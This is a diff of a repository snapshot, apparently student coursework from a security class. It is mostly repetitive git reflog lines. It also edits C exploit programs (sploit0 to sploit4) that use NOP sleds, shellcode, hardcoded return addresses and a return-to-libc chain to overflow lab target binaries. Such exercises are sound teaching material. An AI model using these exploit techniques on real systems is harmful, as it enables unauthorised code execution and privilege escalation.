+524963ab29277056d93616a76b563a6454671341 8d02f023905746625979a31d45bfa7929d4d5cdd justinhalford <justinhalford@gmail.com> 1715383573 -0400	commit: may 7
+8d02f023905746625979a31d45bfa7929d4d5cdd 29d73f16f0120790a49bf07703c2d812a1dc9aba justinhalford <justinhalford@gmail.com> 1715383584 -0400	commit: may 7
+29d73f16f0120790a49bf07703c2d812a1dc9aba 98ce28c9d1a8c42ecdf9fb204902987b632333af justinhalford <justinhalford@gmail.com> 1715383595 -0400	commit: may 7
+98ce28c9d1a8c42ecdf9fb204902987b632333af d147a6aee8432d93a3f9aabc2f886fd0977fb78e justinhalford <justinhalford@gmail.com> 1715383672 -0400	commit: may 7
+d147a6aee8432d93a3f9aabc2f886fd0977fb78e 932d69f9da21d524e584c9cb53043b514bcfd7b2 justinhalford <justinhalford@gmail.com> 1715383699 -0400	commit: may 7
+932d69f9da21d524e584c9cb53043b514bcfd7b2 d5af662a610f6a158585390eb3049279c4d3879f justinhalford <justinhalford@gmail.com> 1715383761 -0400	commit: may 7
+d5af662a610f6a158585390eb3049279c4d3879f a367eadd204f119d8419821031ccacb806280906 justinhalford <justinhalford@gmail.com> 1715383788 -0400	commit: may 7
+a367eadd204f119d8419821031ccacb806280906 f62b9a8b8e0c4f83ee5992807acfd28099dce507 justinhalford <justinhalford@gmail.com> 1715383803 -0400	commit: may 7
+f62b9a8b8e0c4f83ee5992807acfd28099dce507 cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 justinhalford <justinhalford@gmail.com> 1715387446 -0400	commit: may 7
+cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 f46b7b672386946268850dec0c1b4c4e3505fdbc justinhalford <justinhalford@gmail.com> 1715387619 -0400	commit: may 7
+f46b7b672386946268850dec0c1b4c4e3505fdbc 07b69abb102fed6e835af43aee45bef7daf4d307 justinhalford <justinhalford@gmail.com> 1715387722 -0400	commit: may 7
+07b69abb102fed6e835af43aee45bef7daf4d307 10320e1ee34661b1b312d9107df873eafdba286e justinhalford <justinhalford@gmail.com> 1715388017 -0400	commit: may 7
 
 <END OF ./.git/logs/HEAD>
 <START OF ./.git/logs/refs/heads/master>
@@ -3528,6 +3626,31 @@ dd503d0e4ca4ed6b86c62388c85cdc54a03256f6 6c0b2d5867f396a97b23cde8ed5211a14f0c224
 e83b727d1762061b00cc378e9e600cda749b3965 4187ce2e3f77403c7eb4651891e4142b5e3f41ac justinhalford <justinhalford@gmail.com> 1715382652 -0400	commit: may 7
 4187ce2e3f77403c7eb4651891e4142b5e3f41ac 21d3c37666d45cce3a83a9b93e3b4210151915b9 justinhalford <justinhalford@gmail.com> 1715382662 -0400	commit: may 7
 21d3c37666d45cce3a83a9b93e3b4210151915b9 d7dafefe27ba333f459e25575ca0bafa491fd46b justinhalford <justinhalford@gmail.com> 1715382671 -0400	commit: may 7
+d7dafefe27ba333f459e25575ca0bafa491fd46b 3311e4f33ed1834a9ea7f895f9e985849e003361 justinhalford <justinhalford@gmail.com> 1715382858 -0400	commit: may 7
+3311e4f33ed1834a9ea7f895f9e985849e003361 d1ec71a64b90955e37aeed39aa419f3197ade355 justinhalford <justinhalford@gmail.com> 1715382892 -0400	commit: may 7
+d1ec71a64b90955e37aeed39aa419f3197ade355 899a633700bb417e6472977e2d1abf6d638027ae justinhalford <justinhalford@gmail.com> 1715382978 -0400	commit: may 7
+899a633700bb417e6472977e2d1abf6d638027ae a3984938432686ba4df2c95eb65b5cf9e9f31641 justinhalford <justinhalford@gmail.com> 1715383009 -0400	commit: may 7
+a3984938432686ba4df2c95eb65b5cf9e9f31641 5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 justinhalford <justinhalford@gmail.com> 1715383026 -0400	commit: may 7
+5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 933167130761652c11e6af17f43782718933abee justinhalford <justinhalford@gmail.com> 1715383096 -0400	commit: may 7
+933167130761652c11e6af17f43782718933abee 6ccccfa794d72071f763167919ac735c09d65641 justinhalford <justinhalford@gmail.com> 1715383145 -0400	commit: may 7
+6ccccfa794d72071f763167919ac735c09d65641 78370f9cf6b56836b8fc495e7caf4cbccab2e82c justinhalford <justinhalford@gmail.com> 1715383231 -0400	commit: may 7
+78370f9cf6b56836b8fc495e7caf4cbccab2e82c 8634c0fdb323ce207efc409f6fd789e34197424b justinhalford <justinhalford@gmail.com> 1715383251 -0400	commit: may 7
+8634c0fdb323ce207efc409f6fd789e34197424b eaa53e37db0682f2c1aefd185a14cf8d3d80507e justinhalford <justinhalford@gmail.com> 1715383400 -0400	commit: may 7
+eaa53e37db0682f2c1aefd185a14cf8d3d80507e a94c97ce7ff5b186f188cd8f110ad9bdc212b225 justinhalford <justinhalford@gmail.com> 1715383453 -0400	commit: may 7
+a94c97ce7ff5b186f188cd8f110ad9bdc212b225 39d571f431967e0c9352b2d9835be170e9f818cd justinhalford <justinhalford@gmail.com> 1715383460 -0400	commit: may 7
+39d571f431967e0c9352b2d9835be170e9f818cd 524963ab29277056d93616a76b563a6454671341 justinhalford <justinhalford@gmail.com> 1715383563 -0400	commit: may 7
+524963ab29277056d93616a76b563a6454671341 8d02f023905746625979a31d45bfa7929d4d5cdd justinhalford <justinhalford@gmail.com> 1715383573 -0400	commit: may 7
+8d02f023905746625979a31d45bfa7929d4d5cdd 29d73f16f0120790a49bf07703c2d812a1dc9aba justinhalford <justinhalford@gmail.com> 1715383584 -0400	commit: may 7
+29d73f16f0120790a49bf07703c2d812a1dc9aba 98ce28c9d1a8c42ecdf9fb204902987b632333af justinhalford <justinhalford@gmail.com> 1715383595 -0400	commit: may 7
+98ce28c9d1a8c42ecdf9fb204902987b632333af d147a6aee8432d93a3f9aabc2f886fd0977fb78e justinhalford <justinhalford@gmail.com> 1715383672 -0400	commit: may 7
+d147a6aee8432d93a3f9aabc2f886fd0977fb78e 932d69f9da21d524e584c9cb53043b514bcfd7b2 justinhalford <justinhalford@gmail.com> 1715383699 -0400	commit: may 7
+932d69f9da21d524e584c9cb53043b514bcfd7b2 d5af662a610f6a158585390eb3049279c4d3879f justinhalford <justinhalford@gmail.com> 1715383761 -0400	commit: may 7
+d5af662a610f6a158585390eb3049279c4d3879f a367eadd204f119d8419821031ccacb806280906 justinhalford <justinhalford@gmail.com> 1715383788 -0400	commit: may 7
+a367eadd204f119d8419821031ccacb806280906 f62b9a8b8e0c4f83ee5992807acfd28099dce507 justinhalford <justinhalford@gmail.com> 1715383803 -0400	commit: may 7
+f62b9a8b8e0c4f83ee5992807acfd28099dce507 cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 justinhalford <justinhalford@gmail.com> 1715387446 -0400	commit: may 7
+cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 f46b7b672386946268850dec0c1b4c4e3505fdbc justinhalford <justinhalford@gmail.com> 1715387619 -0400	commit: may 7
+f46b7b672386946268850dec0c1b4c4e3505fdbc 07b69abb102fed6e835af43aee45bef7daf4d307 justinhalford <justinhalford@gmail.com> 1715387722 -0400	commit: may 7
+07b69abb102fed6e835af43aee45bef7daf4d307 10320e1ee34661b1b312d9107df873eafdba286e justinhalford <justinhalford@gmail.com> 1715388017 -0400	commit: may 7
 
 <END OF ./.git/logs/refs/heads/master>
 <START OF ./.git/logs/refs/remotes/origin/master>
@@ -3659,6 +3782,31 @@ dd503d0e4ca4ed6b86c62388c85cdc54a03256f6 6c0b2d5867f396a97b23cde8ed5211a14f0c224
 e83b727d1762061b00cc378e9e600cda749b3965 4187ce2e3f77403c7eb4651891e4142b5e3f41ac justinhalford <justinhalford@gmail.com> 1715382652 -0400	update by push
 4187ce2e3f77403c7eb4651891e4142b5e3f41ac 21d3c37666d45cce3a83a9b93e3b4210151915b9 justinhalford <justinhalford@gmail.com> 1715382663 -0400	update by push
 21d3c37666d45cce3a83a9b93e3b4210151915b9 d7dafefe27ba333f459e25575ca0bafa491fd46b justinhalford <justinhalford@gmail.com> 1715382672 -0400	update by push
+d7dafefe27ba333f459e25575ca0bafa491fd46b 3311e4f33ed1834a9ea7f895f9e985849e003361 justinhalford <justinhalford@gmail.com> 1715382859 -0400	update by push
+3311e4f33ed1834a9ea7f895f9e985849e003361 d1ec71a64b90955e37aeed39aa419f3197ade355 justinhalford <justinhalford@gmail.com> 1715382892 -0400	update by push
+d1ec71a64b90955e37aeed39aa419f3197ade355 899a633700bb417e6472977e2d1abf6d638027ae justinhalford <justinhalford@gmail.com> 1715382979 -0400	update by push
+899a633700bb417e6472977e2d1abf6d638027ae a3984938432686ba4df2c95eb65b5cf9e9f31641 justinhalford <justinhalford@gmail.com> 1715383010 -0400	update by push
+a3984938432686ba4df2c95eb65b5cf9e9f31641 5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 justinhalford <justinhalford@gmail.com> 1715383027 -0400	update by push
+5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 933167130761652c11e6af17f43782718933abee justinhalford <justinhalford@gmail.com> 1715383097 -0400	update by push
+933167130761652c11e6af17f43782718933abee 6ccccfa794d72071f763167919ac735c09d65641 justinhalford <justinhalford@gmail.com> 1715383146 -0400	update by push
+6ccccfa794d72071f763167919ac735c09d65641 78370f9cf6b56836b8fc495e7caf4cbccab2e82c justinhalford <justinhalford@gmail.com> 1715383232 -0400	update by push
+78370f9cf6b56836b8fc495e7caf4cbccab2e82c 8634c0fdb323ce207efc409f6fd789e34197424b justinhalford <justinhalford@gmail.com> 1715383251 -0400	update by push
+8634c0fdb323ce207efc409f6fd789e34197424b eaa53e37db0682f2c1aefd185a14cf8d3d80507e justinhalford <justinhalford@gmail.com> 1715383401 -0400	update by push
+eaa53e37db0682f2c1aefd185a14cf8d3d80507e a94c97ce7ff5b186f188cd8f110ad9bdc212b225 justinhalford <justinhalford@gmail.com> 1715383453 -0400	update by push
+a94c97ce7ff5b186f188cd8f110ad9bdc212b225 39d571f431967e0c9352b2d9835be170e9f818cd justinhalford <justinhalford@gmail.com> 1715383461 -0400	update by push
+39d571f431967e0c9352b2d9835be170e9f818cd 524963ab29277056d93616a76b563a6454671341 justinhalford <justinhalford@gmail.com> 1715383563 -0400	update by push
+524963ab29277056d93616a76b563a6454671341 8d02f023905746625979a31d45bfa7929d4d5cdd justinhalford <justinhalford@gmail.com> 1715383573 -0400	update by push
+8d02f023905746625979a31d45bfa7929d4d5cdd 29d73f16f0120790a49bf07703c2d812a1dc9aba justinhalford <justinhalford@gmail.com> 1715383585 -0400	update by push
+29d73f16f0120790a49bf07703c2d812a1dc9aba 98ce28c9d1a8c42ecdf9fb204902987b632333af justinhalford <justinhalford@gmail.com> 1715383596 -0400	update by push
+98ce28c9d1a8c42ecdf9fb204902987b632333af d147a6aee8432d93a3f9aabc2f886fd0977fb78e justinhalford <justinhalford@gmail.com> 1715383673 -0400	update by push
+d147a6aee8432d93a3f9aabc2f886fd0977fb78e 932d69f9da21d524e584c9cb53043b514bcfd7b2 justinhalford <justinhalford@gmail.com> 1715383700 -0400	update by push
+932d69f9da21d524e584c9cb53043b514bcfd7b2 d5af662a610f6a158585390eb3049279c4d3879f justinhalford <justinhalford@gmail.com> 1715383761 -0400	update by push
+d5af662a610f6a158585390eb3049279c4d3879f a367eadd204f119d8419821031ccacb806280906 justinhalford <justinhalford@gmail.com> 1715383788 -0400	update by push
+a367eadd204f119d8419821031ccacb806280906 f62b9a8b8e0c4f83ee5992807acfd28099dce507 justinhalford <justinhalford@gmail.com> 1715383803 -0400	update by push
+f62b9a8b8e0c4f83ee5992807acfd28099dce507 cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 justinhalford <justinhalford@gmail.com> 1715387447 -0400	update by push
+cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 f46b7b672386946268850dec0c1b4c4e3505fdbc justinhalford <justinhalford@gmail.com> 1715387619 -0400	update by push
+f46b7b672386946268850dec0c1b4c4e3505fdbc 07b69abb102fed6e835af43aee45bef7daf4d307 justinhalford <justinhalford@gmail.com> 1715387723 -0400	update by push
+07b69abb102fed6e835af43aee45bef7daf4d307 10320e1ee34661b1b312d9107df873eafdba286e justinhalford <justinhalford@gmail.com> 1715388018 -0400	update by push
 
 <END OF ./.git/logs/refs/remotes/origin/master>
 <START OF ./.git/hooks/commit-msg.sample>
@@ -4410,11 +4558,11 @@ exit 0
 
 <END OF ./.git/hooks/update.sample>
 <START OF ./.git/refs/heads/master>
-d7dafefe27ba333f459e25575ca0bafa491fd46b
+10320e1ee34661b1b312d9107df873eafdba286e
 
 <END OF ./.git/refs/heads/master>
 <START OF ./.git/refs/remotes/origin/master>
-d7dafefe27ba333f459e25575ca0bafa491fd46b
+10320e1ee34661b1b312d9107df873eafdba286e
 
 <END OF ./.git/refs/remotes/origin/master>
 <START OF ./.vscode/settings.json>
@@ -4795,31 +4943,31 @@ int main(void)
 
 #define TARGET "/srv/target2"
 
-const int BUFFER_SIZE = 409;
-const int SHELLCODE_OFFSET = 201;
-const uint32_t RETURN_ADDRESS = 0xffffdb5c;
+const int BSIZE = 409;
+const int DIFF = 201;
+const uint32_t RET = 0xffffdb5c;
 
-void preparePayload(char *buffer) {
-    memset(buffer, 0x90, BUFFER_SIZE - 1);
-    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);
+void prep(char *buf) {
+    memset(buf, 0x90, BSIZE - 1);
+    memcpy(buf + DIFF, shellcode, sizeof(shellcode) - 1);
 
-    for (int i = SHELLCODE_OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
-        *(uint32_t *)(buffer + i) = RETURN_ADDRESS;
+    for (int i = DIFF + sizeof(shellcode) - 1; i < BSIZE - 1; i += 4) {
+        *(uint32_t *)(buf + i) = RET;
     }
 
-    buffer[BUFFER_SIZE - 1] = '\0';
+    buf[BSIZE - 1] = '\0';
 }
 
 int main(void)
 {
     char *args[4];
     char *env[1];
-    char payload[BUFFER_SIZE];
+    char buf[BSIZE];
 
-    preparePayload(payload);
+    prep(buf);
 
     args[0] = TARGET;
-    args[1] = payload;
+    args[1] = buf;
     args[2] = "65935";
     args[3] = NULL;
 
@@ -4897,34 +5045,34 @@ if __name__ == "__main__":
 #include <unistd.h>
 #include "shellcode.h"
 
-const char* TARGET = "/srv/target0";
+const char* TARGET = "/srv/target3";
 
-const int PAYLOADSIZE = 408;
-const int SHELLCODESIZE = sizeof(shellcode) - 1;
-const uint32_t RETADDR = 0xffffdb2c;
+const int ESIZE = 400;
+const uint32_t BASE = 0xffffdec0;
+const int NSIZE = 201;
+const char NOP = 0x90;
+const int DIFF = 4;
+const uint32_t A1 = BASE + DIFF;
+const uint32_t A2 = BASE + 2 * DIFF;
+const char buf[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
-void prepPayload(char *payload) {
-    memset(payload, 0x90, PAYLOADSIZE);
-    payload[PAYLOADSIZE] = '\0';
-    memcpy(payload, shellcode, SHELLCODESIZE);
-    *(uint32_t*)(payload + PAYLOADSIZE - 4) = RETADDR;
+void prep(char *e) {
+    memset(e, NOP, ESIZE - 1);
+    *((uint32_t *)(e)) = A1;
+    *((uint32_t *)(e + DIFF)) = A2;
+    memcpy(e + NSIZE, shellcode, sizeof(shellcode));
+    e[ESIZE - 1] = '\0';
 }
 
-int main(void)
-{
-    char *args[3];
-    char *env[1];
-    char payload[PAYLOADSIZE + 1];
+int main(void) {
+    char *args[] = {TARGET, buf, NULL};
+    char env[ESIZE];
 
-    prepPayload(payload);
+    prep(env);
 
-    args[0] = TARGET;
-    args[1] = payload;
-    args[2] = NULL;
+    char *envp[] = {env};
 
-    env[0] = NULL;
-
-    execve(TARGET, args, env);
+    execve(TARGET, args, envp);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
@@ -4948,27 +5096,27 @@ static char shellcode[] =
 
 #define TARGET "/srv/target0"
 
-const int PAYLOAD_SIZE = 408;
-const int SHELLCODE_SIZE = sizeof(shellcode) - 1;
-const uint32_t RETURN_ADDRESS = 0xffffdb2c;
+const int BSIZE = 408;
+const int SHSIZE = sizeof(shellcode) - 1;
+const uint32_t RET = 0xffffdb2c;
 
-void preparePayload(char *payload) {
-    memset(payload, 0x90, PAYLOAD_SIZE);
-    payload[PAYLOAD_SIZE] = '\0';
-    memcpy(payload, shellcode, SHELLCODE_SIZE);
-    *(uint32_t*)(payload + PAYLOAD_SIZE - 4) = RETURN_ADDRESS;
+void prep(char *buf) {
+    memset(buf, 0x90, BSIZE);
+    buf[BSIZE] = '\0';
+    memcpy(buf, shellcode, SHSIZE);
+    *(uint32_t*)(buf + BSIZE - 4) = RET;
 }
 
 int main(void)
 {
     char *args[3];
     char *env[1];
-    char payload[PAYLOAD_SIZE + 1];
+    char buf[BSIZE + 1];
 
-    preparePayload(payload);
+    prep(buf);
 
     args[0] = TARGET;
-    args[1] = payload;
+    args[1] = buf;
     args[2] = NULL;
 
     env[0] = NULL;
@@ -4981,28 +5129,28 @@ int main(void)
 <END OF ./cs5435-hw4/sploits/sploit0.c>
 <START OF ./cs5435-hw4/sploits/sploit4.c>
 #include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
 #include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 #include "shellcode.h"
-
-#define TARGET "/srv/target4"
+const char* TARGET = "/srv/target4";
+const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
+const char* SYS = "\x60\x43\xe1\xf7";
+const char* EX = "\xc0\x6e\xe0\xf7";
+const char* SH = "\x63\xf3\xf5\xf7";
 
 int main(void)
 {
   char *args[3];
-  char *env[2];
+  char *env[1];
 
+  
   args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90"; //NOP SLED
-            "\x60\x43\xe1\xf7" //Address of system()
-            "\xc0\x6e\xe0\xf7" //Address of exit()
-            "\x63\xf3\xf5\xf7"; //Address of /bin/zh
+  args[1] = SLED SYS EX SH;
   args[2] = NULL;
 
-  env[0] = "/bin/zsh";
-  env[1] = NULL;
+  env[0] = NULL;
 
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
@@ -5607,6 +5755,31 @@ dd503d0e4ca4ed6b86c62388c85cdc54a03256f6 6c0b2d5867f396a97b23cde8ed5211a14f0c224
 e83b727d1762061b00cc378e9e600cda749b3965 4187ce2e3f77403c7eb4651891e4142b5e3f41ac justinhalford <justinhalford@gmail.com> 1715382652 -0400	commit: may 7
 4187ce2e3f77403c7eb4651891e4142b5e3f41ac 21d3c37666d45cce3a83a9b93e3b4210151915b9 justinhalford <justinhalford@gmail.com> 1715382662 -0400	commit: may 7
 21d3c37666d45cce3a83a9b93e3b4210151915b9 d7dafefe27ba333f459e25575ca0bafa491fd46b justinhalford <justinhalford@gmail.com> 1715382671 -0400	commit: may 7
+d7dafefe27ba333f459e25575ca0bafa491fd46b 3311e4f33ed1834a9ea7f895f9e985849e003361 justinhalford <justinhalford@gmail.com> 1715382858 -0400	commit: may 7
+3311e4f33ed1834a9ea7f895f9e985849e003361 d1ec71a64b90955e37aeed39aa419f3197ade355 justinhalford <justinhalford@gmail.com> 1715382892 -0400	commit: may 7
+d1ec71a64b90955e37aeed39aa419f3197ade355 899a633700bb417e6472977e2d1abf6d638027ae justinhalford <justinhalford@gmail.com> 1715382978 -0400	commit: may 7
+899a633700bb417e6472977e2d1abf6d638027ae a3984938432686ba4df2c95eb65b5cf9e9f31641 justinhalford <justinhalford@gmail.com> 1715383009 -0400	commit: may 7
+a3984938432686ba4df2c95eb65b5cf9e9f31641 5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 justinhalford <justinhalford@gmail.com> 1715383026 -0400	commit: may 7
+5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 933167130761652c11e6af17f43782718933abee justinhalford <justinhalford@gmail.com> 1715383096 -0400	commit: may 7
+933167130761652c11e6af17f43782718933abee 6ccccfa794d72071f763167919ac735c09d65641 justinhalford <justinhalford@gmail.com> 1715383145 -0400	commit: may 7
+6ccccfa794d72071f763167919ac735c09d65641 78370f9cf6b56836b8fc495e7caf4cbccab2e82c justinhalford <justinhalford@gmail.com> 1715383231 -0400	commit: may 7
+78370f9cf6b56836b8fc495e7caf4cbccab2e82c 8634c0fdb323ce207efc409f6fd789e34197424b justinhalford <justinhalford@gmail.com> 1715383251 -0400	commit: may 7
+8634c0fdb323ce207efc409f6fd789e34197424b eaa53e37db0682f2c1aefd185a14cf8d3d80507e justinhalford <justinhalford@gmail.com> 1715383400 -0400	commit: may 7
+eaa53e37db0682f2c1aefd185a14cf8d3d80507e a94c97ce7ff5b186f188cd8f110ad9bdc212b225 justinhalford <justinhalford@gmail.com> 1715383453 -0400	commit: may 7
+a94c97ce7ff5b186f188cd8f110ad9bdc212b225 39d571f431967e0c9352b2d9835be170e9f818cd justinhalford <justinhalford@gmail.com> 1715383460 -0400	commit: may 7
+39d571f431967e0c9352b2d9835be170e9f818cd 524963ab29277056d93616a76b563a6454671341 justinhalford <justinhalford@gmail.com> 1715383563 -0400	commit: may 7
+524963ab29277056d93616a76b563a6454671341 8d02f023905746625979a31d45bfa7929d4d5cdd justinhalford <justinhalford@gmail.com> 1715383573 -0400	commit: may 7
+8d02f023905746625979a31d45bfa7929d4d5cdd 29d73f16f0120790a49bf07703c2d812a1dc9aba justinhalford <justinhalford@gmail.com> 1715383584 -0400	commit: may 7
+29d73f16f0120790a49bf07703c2d812a1dc9aba 98ce28c9d1a8c42ecdf9fb204902987b632333af justinhalford <justinhalford@gmail.com> 1715383595 -0400	commit: may 7
+98ce28c9d1a8c42ecdf9fb204902987b632333af d147a6aee8432d93a3f9aabc2f886fd0977fb78e justinhalford <justinhalford@gmail.com> 1715383672 -0400	commit: may 7
+d147a6aee8432d93a3f9aabc2f886fd0977fb78e 932d69f9da21d524e584c9cb53043b514bcfd7b2 justinhalford <justinhalford@gmail.com> 1715383699 -0400	commit: may 7
+932d69f9da21d524e584c9cb53043b514bcfd7b2 d5af662a610f6a158585390eb3049279c4d3879f justinhalford <justinhalford@gmail.com> 1715383761 -0400	commit: may 7
+d5af662a610f6a158585390eb3049279c4d3879f a367eadd204f119d8419821031ccacb806280906 justinhalford <justinhalford@gmail.com> 1715383788 -0400	commit: may 7
+a367eadd204f119d8419821031ccacb806280906 f62b9a8b8e0c4f83ee5992807acfd28099dce507 justinhalford <justinhalford@gmail.com> 1715383803 -0400	commit: may 7
+f62b9a8b8e0c4f83ee5992807acfd28099dce507 cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 justinhalford <justinhalford@gmail.com> 1715387446 -0400	commit: may 7
+cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 f46b7b672386946268850dec0c1b4c4e3505fdbc justinhalford <justinhalford@gmail.com> 1715387619 -0400	commit: may 7
+f46b7b672386946268850dec0c1b4c4e3505fdbc 07b69abb102fed6e835af43aee45bef7daf4d307 justinhalford <justinhalford@gmail.com> 1715387722 -0400	commit: may 7
+07b69abb102fed6e835af43aee45bef7daf4d307 10320e1ee34661b1b312d9107df873eafdba286e justinhalford <justinhalford@gmail.com> 1715388017 -0400	commit: may 7
 
 <END OF ./.git/logs/HEAD>
 <START OF ./.git/logs/refs/heads/master>
@@ -5737,6 +5910,31 @@ dd503d0e4ca4ed6b86c62388c85cdc54a03256f6 6c0b2d5867f396a97b23cde8ed5211a14f0c224
 e83b727d1762061b00cc378e9e600cda749b3965 4187ce2e3f77403c7eb4651891e4142b5e3f41ac justinhalford <justinhalford@gmail.com> 1715382652 -0400	commit: may 7
 4187ce2e3f77403c7eb4651891e4142b5e3f41ac 21d3c37666d45cce3a83a9b93e3b4210151915b9 justinhalford <justinhalford@gmail.com> 1715382662 -0400	commit: may 7
 21d3c37666d45cce3a83a9b93e3b4210151915b9 d7dafefe27ba333f459e25575ca0bafa491fd46b justinhalford <justinhalford@gmail.com> 1715382671 -0400	commit: may 7
+d7dafefe27ba333f459e25575ca0bafa491fd46b 3311e4f33ed1834a9ea7f895f9e985849e003361 justinhalford <justinhalford@gmail.com> 1715382858 -0400	commit: may 7
+3311e4f33ed1834a9ea7f895f9e985849e003361 d1ec71a64b90955e37aeed39aa419f3197ade355 justinhalford <justinhalford@gmail.com> 1715382892 -0400	commit: may 7
+d1ec71a64b90955e37aeed39aa419f3197ade355 899a633700bb417e6472977e2d1abf6d638027ae justinhalford <justinhalford@gmail.com> 1715382978 -0400	commit: may 7
+899a633700bb417e6472977e2d1abf6d638027ae a3984938432686ba4df2c95eb65b5cf9e9f31641 justinhalford <justinhalford@gmail.com> 1715383009 -0400	commit: may 7
+a3984938432686ba4df2c95eb65b5cf9e9f31641 5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 justinhalford <justinhalford@gmail.com> 1715383026 -0400	commit: may 7
+5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 933167130761652c11e6af17f43782718933abee justinhalford <justinhalford@gmail.com> 1715383096 -0400	commit: may 7
+933167130761652c11e6af17f43782718933abee 6ccccfa794d72071f763167919ac735c09d65641 justinhalford <justinhalford@gmail.com> 1715383145 -0400	commit: may 7
+6ccccfa794d72071f763167919ac735c09d65641 78370f9cf6b56836b8fc495e7caf4cbccab2e82c justinhalford <justinhalford@gmail.com> 1715383231 -0400	commit: may 7
+78370f9cf6b56836b8fc495e7caf4cbccab2e82c 8634c0fdb323ce207efc409f6fd789e34197424b justinhalford <justinhalford@gmail.com> 1715383251 -0400	commit: may 7
+8634c0fdb323ce207efc409f6fd789e34197424b eaa53e37db0682f2c1aefd185a14cf8d3d80507e justinhalford <justinhalford@gmail.com> 1715383400 -0400	commit: may 7
+eaa53e37db0682f2c1aefd185a14cf8d3d80507e a94c97ce7ff5b186f188cd8f110ad9bdc212b225 justinhalford <justinhalford@gmail.com> 1715383453 -0400	commit: may 7
+a94c97ce7ff5b186f188cd8f110ad9bdc212b225 39d571f431967e0c9352b2d9835be170e9f818cd justinhalford <justinhalford@gmail.com> 1715383460 -0400	commit: may 7
+39d571f431967e0c9352b2d9835be170e9f818cd 524963ab29277056d93616a76b563a6454671341 justinhalford <justinhalford@gmail.com> 1715383563 -0400	commit: may 7
+524963ab29277056d93616a76b563a6454671341 8d02f023905746625979a31d45bfa7929d4d5cdd justinhalford <justinhalford@gmail.com> 1715383573 -0400	commit: may 7
+8d02f023905746625979a31d45bfa7929d4d5cdd 29d73f16f0120790a49bf07703c2d812a1dc9aba justinhalford <justinhalford@gmail.com> 1715383584 -0400	commit: may 7
+29d73f16f0120790a49bf07703c2d812a1dc9aba 98ce28c9d1a8c42ecdf9fb204902987b632333af justinhalford <justinhalford@gmail.com> 1715383595 -0400	commit: may 7
+98ce28c9d1a8c42ecdf9fb204902987b632333af d147a6aee8432d93a3f9aabc2f886fd0977fb78e justinhalford <justinhalford@gmail.com> 1715383672 -0400	commit: may 7
+d147a6aee8432d93a3f9aabc2f886fd0977fb78e 932d69f9da21d524e584c9cb53043b514bcfd7b2 justinhalford <justinhalford@gmail.com> 1715383699 -0400	commit: may 7
+932d69f9da21d524e584c9cb53043b514bcfd7b2 d5af662a610f6a158585390eb3049279c4d3879f justinhalford <justinhalford@gmail.com> 1715383761 -0400	commit: may 7
+d5af662a610f6a158585390eb3049279c4d3879f a367eadd204f119d8419821031ccacb806280906 justinhalford <justinhalford@gmail.com> 1715383788 -0400	commit: may 7
+a367eadd204f119d8419821031ccacb806280906 f62b9a8b8e0c4f83ee5992807acfd28099dce507 justinhalford <justinhalford@gmail.com> 1715383803 -0400	commit: may 7
+f62b9a8b8e0c4f83ee5992807acfd28099dce507 cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 justinhalford <justinhalford@gmail.com> 1715387446 -0400	commit: may 7
+cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 f46b7b672386946268850dec0c1b4c4e3505fdbc justinhalford <justinhalford@gmail.com> 1715387619 -0400	commit: may 7
+f46b7b672386946268850dec0c1b4c4e3505fdbc 07b69abb102fed6e835af43aee45bef7daf4d307 justinhalford <justinhalford@gmail.com> 1715387722 -0400	commit: may 7
+07b69abb102fed6e835af43aee45bef7daf4d307 10320e1ee34661b1b312d9107df873eafdba286e justinhalford <justinhalford@gmail.com> 1715388017 -0400	commit: may 7
 
 <END OF ./.git/logs/refs/heads/master>
 <START OF ./.git/logs/refs/remotes/origin/master>
@@ -5868,6 +6066,31 @@ dd503d0e4ca4ed6b86c62388c85cdc54a03256f6 6c0b2d5867f396a97b23cde8ed5211a14f0c224
 e83b727d1762061b00cc378e9e600cda749b3965 4187ce2e3f77403c7eb4651891e4142b5e3f41ac justinhalford <justinhalford@gmail.com> 1715382652 -0400	update by push
 4187ce2e3f77403c7eb4651891e4142b5e3f41ac 21d3c37666d45cce3a83a9b93e3b4210151915b9 justinhalford <justinhalford@gmail.com> 1715382663 -0400	update by push
 21d3c37666d45cce3a83a9b93e3b4210151915b9 d7dafefe27ba333f459e25575ca0bafa491fd46b justinhalford <justinhalford@gmail.com> 1715382672 -0400	update by push
+d7dafefe27ba333f459e25575ca0bafa491fd46b 3311e4f33ed1834a9ea7f895f9e985849e003361 justinhalford <justinhalford@gmail.com> 1715382859 -0400	update by push
+3311e4f33ed1834a9ea7f895f9e985849e003361 d1ec71a64b90955e37aeed39aa419f3197ade355 justinhalford <justinhalford@gmail.com> 1715382892 -0400	update by push
+d1ec71a64b90955e37aeed39aa419f3197ade355 899a633700bb417e6472977e2d1abf6d638027ae justinhalford <justinhalford@gmail.com> 1715382979 -0400	update by push
+899a633700bb417e6472977e2d1abf6d638027ae a3984938432686ba4df2c95eb65b5cf9e9f31641 justinhalford <justinhalford@gmail.com> 1715383010 -0400	update by push
